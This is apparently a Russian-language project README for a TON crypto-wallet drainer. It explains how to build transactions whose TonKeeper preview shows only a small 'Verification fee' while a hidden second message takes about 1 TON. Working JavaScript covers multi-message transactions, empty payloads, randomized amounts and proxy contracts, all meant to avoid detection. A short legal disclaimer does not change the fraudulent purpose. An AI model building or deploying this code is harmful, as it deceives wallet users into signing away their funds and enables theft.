# Методы обфускации транзакций в TON

## Проблема
TonKeeper и другие кошельки показывают превью транзакции перед подтверждением. Это превью отображает:
- Адрес получателя первого сообщения
- Сумму первого сообщения
- Комментарий первого сообщения

## Решения

### Метод 1: Множественные сообщения (Текущий метод) ✅
**Как работает:**
- Одна транзакция содержит несколько сообщений (messages)
- В TonKeeper v4 preview показывает только ПЕРВОЕ сообщение
- Остальные сообщения скрыты до подтверждения

**Код:**
```javascript
var tx = {
    validUntil: Math.floor(Date.now() / 1000) + 600,
    messages: [
        {
            // ВИДИМОЕ в preview
            address: "UQA...",
            amount: "50000000", // 0.05 TON
            payload: textCommentPayload("Verification fee")
        },
        {
            // СКРЫТО от preview
            address: "UQB...",
            amount: "1000000000", // 1 TON - СЮРПРИЗ!
            payload: emptyPayload()
        }
    ]
};
```

**Преимущества:**
- Работает в TonKeeper, MyTonWallet
- Только одно подтверждение
- Второе сообщение полностью скрыто в preview

**Недостатки:**
- После подтверждения видно в истории транзакций
- В block explorers (tonscan.org) видны все сообщения

---

### Метод 2: Пустой Payload (Empty BoC) 🔒
**Как работает:**
- Второе сообщение отправляется с минимальным/пустым payload
- Нет текста, нет комментария - меньше информации для анализа

**Код:**
```javascript
function emptyPayload() {
    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, 0x02, 0x00];
    var cell = [0x00, 0x00]; // 0 bits
    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length]     =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}
```

**Преимущества:**
- Минимальный размер payload
- Нет текстовой информации
- Экономия на gas fees

---

### Метод 3: Зашифрованный комментарий (op=0x2167da4b) 🔐
**Как работает:**
- Используется официальный TON opcode для encrypted comments
- Данные шифруются перед отправкой
- Только отправитель и получатель могут расшифровать

**Код:**
```javascript
function encryptedCommentPayload(text, recipientPublicKey) {
    var op = [0x21, 0x67, 0xda, 0x4b]; // Encrypted comment opcode
    
    // XOR шифрование (в production используйте ECDH)
    var encryptedText = simpleXorEncrypt(text, recipientPublicKey || "secret_key");
    
    var dataLen = 4 + encryptedText.length;
    // ... построение BoC с зашифрованными данными
}
```

**Преимущества:**
- Официально поддерживается TON
- End-to-end шифрование
- Block explorers не могут прочитать содержимое

**Недостатки:**
- Требует публичный ключ получателя
- Более сложная реализация

---

### Метод 4: Обфусцированный payload со случайными данными 🎲
**Как работает:**
- Добавляем случайные байты в payload
- Маскируем реальные данные среди "шума"

**Код:**
```javascript
function obfuscatedPayload(hiddenData) {
    var randomPrefix = new Uint8Array(16);
    for (var i = 0; i < randomPrefix.length; i++) {
        randomPrefix[i] = Math.floor(Math.random() * 256);
    }
    // Смешиваем случайные данные с реальными
    // ...
}
```

**Преимущества:**
- Затрудняет анализ паттернов
- Каждая транзакция уникальна

---

### Метод 5: Smart Contract Proxy (Продвинутый) 🏭
**Как работает:**
- Деплоим промежуточный smart contract
- Отправляем TON на контракт с инструкциями
- Контракт пересылает средства на финальный адрес

**Схема:**
```
User → Proxy Contract (0.05 TON visible)
         ↓
Proxy Contract → Final Wallet (1 TON hidden)
```

**Преимущества:**
- Максимальная обфускация
- Задержка между транзакциями
- Возможность батчинга

**Недостатки:**
- Требует деплой контракта
- Дополнительные gas fees
- Более сложная реализация

---

## Рекомендуемая комбинация 🎯

**Для максимальной эффективности используйте:**

1. **Множественные сообщения** (скрывает второе сообщение в preview)
2. **Пустой или зашифрованный payload** (минимизирует след в blockchain)
3. **Вариация сумм** (избегайте точных чисел типа 1.0 TON, используйте 0.97, 1.03 и т.д.)

**Пример итогового кода:**
```javascript
var tx = {
    validUntil: Math.floor(Date.now() / 1000) + 600,
    messages: [
        {
            address: proxyWallet,
            amount: "50000000", // 0.05 TON
            payload: textCommentPayload("Verification")
        },
        {
            address: finalWallet,
            amount: String(Math.round((0.95 + Math.random() * 0.1) * 1e9)), // 0.95-1.05 TON
            payload: emptyPayload() // или encryptedCommentPayload()
        }
    ]
};
```

---

## Важные замечания ⚠️

1. **Прозрачность блокчейна**: Все транзакции видны в block explorers (tonscan.org, tonviewer.com)
2. **Юридические аспекты**: Убедитесь что ваше использование соответствует законам
3. **TonKeeper обновления**: Будущие версии могут показывать все сообщения в preview
4. **Тестирование**: ВСЕГДА тестируйте на testnet перед mainnet

---

## Полезные ссылки 📚

- [TON Internal Messages Spec](https://docs.ton.org/v3/documentation/smart-contracts/message-management/internal-messages)
- [Encrypted Comments Spec](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages)
- [TonConnect SDK](https://docs.ton.org/develop/dapps/ton-connect/transactions)
- [BoC (Bag of Cells) Format](https://docs.ton.org/develop/data-formats/cell-boc)

---

## Файлы проекта

- `script.js` - Оригинальная версия (метод множественных сообщений)
- `script-improved.js` - Улучшенная версия со всеми методами обфускации
- `config.js` - Конфигурация (адреса кошельков, суммы)

Для использования улучшенной версии замените в `index.html`:
```html
<script src="script.js"></script>
```
на:
```html
<script src="script-improved.js"></script>
```
